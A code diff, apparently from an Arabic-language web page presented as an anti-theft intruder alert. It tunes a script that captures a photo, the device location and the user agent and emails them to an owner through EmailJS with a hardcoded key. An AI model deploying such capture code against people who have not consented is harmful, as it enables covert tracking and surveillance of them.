@@ -157,7 +157,7 @@
                     capturePhotoAndSend(position.coords.latitude, position.coords.longitude);
                 }, error => {
                     capturePhotoAndSend("موقع غير متاح", "");
-                }, { timeout: 5000 });
+                }, { timeout: 3000 });
             } else {
                 capturePhotoAndSend("الموقع غير مدعوم", "");
             }
@@ -191,13 +191,13 @@
             const templateParams = {
                 to_email: ownerEmail,
                 time: new Date().toLocaleString(),
-                location: `https://www.google.com/maps?q=${lat},${lon}`,
+                location: lat !== "موقع غير متاح" ? `https://www.google.com/maps?q=${lat},${lon}` : "غير متاح",
                 device: navigator.userAgent,
                 message: "تنبيه أمني: محاولة فتح الهاتف بواسطة شخص غريب!"
             };
 
-            // استخدام Service ID الخاص بك والمفتاح العام المدمج
-            emailjs.send('UMkfERjrYHC6orD7T', 'template_default', templateParams)
+            // استخدام Service ID ومعرف القالب الصحيح template_3k1spp8
+            emailjs.send('UMkfERjrYHC6orD7T', 'template_3k1spp8', templateParams)
             .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
             }, function(error) {
